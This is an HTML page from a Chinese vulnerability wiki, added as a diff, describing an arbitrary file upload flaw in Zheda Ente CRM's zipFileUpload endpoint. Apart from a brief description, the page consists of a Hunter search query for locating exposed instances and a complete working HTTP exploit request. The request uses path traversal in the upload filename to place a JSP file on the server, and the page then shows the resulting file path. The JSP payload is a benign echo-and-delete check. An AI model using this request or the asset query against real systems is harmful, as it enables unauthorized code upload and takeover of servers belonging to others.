@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%B5%99%E5%A4%A7%E6%81%A9%E7%89%B9CRM/%E6%B5%99%E5%A4%A7%E6%81%A9%E7%89%B9CRMzipFileUpload%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>浙大恩特CRM zipFileUpload任意文件上传漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u6d59\u5927\u6069\u7279CRM zipFileUpload\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e", url: "#_top", children: [
+          ]},
+          {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1", children: [
+          ]},
+          {title: "\u4e8c\u3001\u5f71\u54cd\u7248\u672c", url: "#_2", children: [
+          ]},
+          {title: "\u4e09\u3001\u8d44\u4ea7\u6d4b\u7ed8", url: "#_3", children: [
+          ]},
+          {title: "\u56db\u3001\u6f0f\u6d1e\u590d\u73b0", url: "#_4", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E6%B5%99%E5%A4%A7%E6%81%A9%E7%89%B9%E5%AE%A2%E6%88%B7%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E6%B5%99%E5%A4%A7%E6%81%A9%E7%89%B9%E5%AE%A2%E6%88%B7%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%92%8Csql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E6%B5%99%E5%A4%A7%E6%81%A9%E7%89%B9%E5%AE%A2%E6%88%B7%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E6%B5%99%E5%A4%A7%E6%81%A9%E7%89%B9%E5%AE%A2%E6%88%B7%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%92%8Csql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        浙大恩特客户资源管理系统 文件上传和sql注入漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E6%B5%99%E5%A4%A7%E6%81%A9%E7%89%B9CRMsaveFileByPhone%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E6%B5%99%E5%A4%A7%E6%81%A9%E7%89%B9CRMsaveFileByPhone%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        浙大恩特CRM saveFileByPhone任意文件上传漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="crm-zipfileupload">浙大恩特CRM zipFileUpload任意文件上传漏洞<a class="headerlink" href="#crm-zipfileupload" title="Permanent link">&para;</a></h1>
+<h1 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h1>
+<p><font style="color:rgba(0, 0, 0, 0.9);">浙大恩特CRM是由浙江大学恩智浙大科技有限公司推出的客户关系管理（CRM）系统。该系统旨在帮助企业高效管理客户关系，提升销售业绩，促进市场营销和客户服务的优化。系统支持客户数据分析和报表展示，帮助企业深度挖掘客户数据，提供决策参考。浙大恩特CRM zipFileUpload任意文件上传漏洞，攻击者可通过该漏洞获取服务器控制权限。</font></p>
+<h1 id="_2"><font style="color:rgba(0, 0, 0, 0.9);">二、影响版本</font><a class="headerlink" href="#_2" title="Permanent link">&para;</a></h1>
+<ul>
+<li><font style="color:rgba(0, 0, 0, 0.9);">浙大恩特CRM</font></li>
+</ul>
+<h1 id="_3"><font style="color:rgba(0, 0, 0, 0.9);">三、资产测绘</font><a class="headerlink" href="#_3" title="Permanent link">&para;</a></h1>
+<ul>
+<li>hunter<code>app.name="浙大恩特 CRM"</code></li>
+<li>特征</li>
+</ul>
+<p><img alt="1700034640158-a0b751ed-9499-471d-aef1-96b75913aa5a.png" src="./img/okHuxnU_FN0k5qU4/1700034640158-a0b751ed-9499-471d-aef1-96b75913aa5a-432544.png" /></p>
+<h1 id="_4">四、漏洞复现<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h1>
+<div class="highlight"><pre><span></span><code><span class="n">POST</span><span class="w"> </span><span class="o">/</span><span class="n">entsoft</span><span class="o">/</span><span class="n">CrmBasicAction</span><span class="p">.</span><span class="na">entcrm</span><span class="o">?</span><span class="n">method</span><span class="o">=</span><span class="n">zipFileUpload</span><span class="o">&amp;</span><span class="n">c_transModel</span><span class="o">=</span><span class="n">old</span><span class="w"> </span><span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
+<span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span><span class="w"> </span><span class="n">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="n">X11</span><span class="p">;</span><span class="w"> </span><span class="n">Linux</span><span class="w"> </span><span class="n">x86_64</span><span class="p">)</span><span class="w"> </span><span class="n">AppleWebKit</span><span class="o">/</span><span class="mf">537.36</span><span class="w"> </span><span class="p">(</span><span class="n">KHTML</span><span class="p">,</span><span class="w"> </span><span class="n">like</span><span class="w"> </span><span class="n">Gecko</span><span class="p">)</span><span class="w"> </span><span class="n">Chrome</span><span class="o">/</span><span class="mf">62.0.2657.7</span><span class="w"> </span><span class="n">Safari</span><span class="o">/</span><span class="mf">537.36</span>
+<span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span><span class="w"> </span><span class="n">multipart</span><span class="o">/</span><span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span><span class="w"> </span><span class="n">boundary</span><span class="o">=</span><span class="mo">00</span><span class="n">content0boundary00</span>
+<span class="nl">Host</span><span class="p">:</span><span class="w"> </span>
+<span class="nl">Accept</span><span class="p">:</span><span class="w"> </span><span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="p">,</span><span class="w"> </span><span class="n">image</span><span class="o">/</span><span class="n">gif</span><span class="p">,</span><span class="w"> </span><span class="n">image</span><span class="o">/</span><span class="n">jpeg</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="p">;</span><span class="w"> </span><span class="n">q</span><span class="o">=</span><span class="mf">.2</span><span class="p">,</span><span class="w"> </span><span class="o">*/*</span><span class="p">;</span><span class="w"> </span><span class="n">q</span><span class="o">=</span><span class="mf">.2</span>
+<span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span><span class="w"> </span><span class="mi">260</span>
+<span class="nl">Connection</span><span class="p">:</span><span class="w"> </span><span class="n">close</span>
+
+<span class="o">--</span><span class="mo">00</span><span class="n">content0boundary00</span>
+<span class="n">Content</span><span class="o">-</span><span class="n">Disposition</span><span class="p">:</span><span class="w"> </span><span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span><span class="w"> </span><span class="n">name</span><span class="o">=</span><span class="s">&quot;file&quot;</span><span class="p">;</span><span class="w"> </span><span class="n">filename</span><span class="o">=</span><span class="s">&quot;../../stc.jsp&quot;</span>
+<span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span><span class="w"> </span><span class="n">application</span><span class="o">/</span><span class="n">zip</span>
+
+<span class="o">&lt;%</span><span class="w"> </span><span class="n">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="mi">111</span><span class="o">*</span><span class="mi">111</span><span class="p">);</span><span class="k">new</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="na">io</span><span class="p">.</span><span class="na">File</span><span class="p">(</span><span class="n">application</span><span class="p">.</span><span class="na">getRealPath</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="na">getServletPath</span><span class="p">())).</span><span class="na">delete</span><span class="p">();</span><span class="w"> </span><span class="o">%&gt;</span>
+<span class="o">--</span><span class="mo">00</span><span class="n">content0boundary00</span><span class="o">--</span>
+</code></pre></div>
+<p><img alt="1704943891516-566c0363-ef56-4bad-b296-055023951a79.png" src="./img/okHuxnU_FN0k5qU4/1704943891516-566c0363-ef56-4bad-b296-055023951a79-284623.png" /></p>
+<p>根据回显拼接上传文件位置</p>
+<div class="highlight"><pre><span></span><code><span class="o">/</span><span class="n">enterdoc</span><span class="o">/</span><span class="n">dao</span><span class="o">/</span><span class="mi">2024011111284104541134657</span><span class="o">/</span><span class="n">stc</span><span class="p">.</span><span class="na">jsp</span>
+</code></pre></div>
+<p><img alt="1704943976538-ac2f6799-9ce4-41dd-b52a-2c7a0d7fc29a.png" src="./img/okHuxnU_FN0k5qU4/1704943976538-ac2f6799-9ce4-41dd-b52a-2c7a0d7fc29a-011387.png" /></p>
+<p><a href="https://www.yuque.com/attachments/yuque/0/2024/yaml/1622799/1709222145291-128bd578-1b6b-45b2-9d79-58ca0ab390b2.yaml">zhedaente-entsoft-fileupload-CrmBasicAction.yaml</a></p>
+<blockquote>
+<p>更新: 2024-02-29 23:55:45<br />
+原文: <a href="https://www.yuque.com/xiaokp7/ocvun2/vw1xptpqmd5guxwf">https://www.yuque.com/xiaokp7/ocvun2/vw1xptpqmd5guxwf</a></p>
+</blockquote>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E6%B5%99%E5%A4%A7%E6%81%A9%E7%89%B9%E5%AE%A2%E6%88%B7%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E6%B5%99%E5%A4%A7%E6%81%A9%E7%89%B9%E5%AE%A2%E6%88%B7%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%92%8Csql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E6%B5%99%E5%A4%A7%E6%81%A9%E7%89%B9%E5%AE%A2%E6%88%B7%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E6%B5%99%E5%A4%A7%E6%81%A9%E7%89%B9%E5%AE%A2%E6%88%B7%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%92%8Csql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        浙大恩特客户资源管理系统 文件上传和sql注入漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E6%B5%99%E5%A4%A7%E6%81%A9%E7%89%B9CRMsaveFileByPhone%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E6%B5%99%E5%A4%A7%E6%81%A9%E7%89%B9CRMsaveFileByPhone%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        浙大恩特CRM saveFileByPhone任意文件上传漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
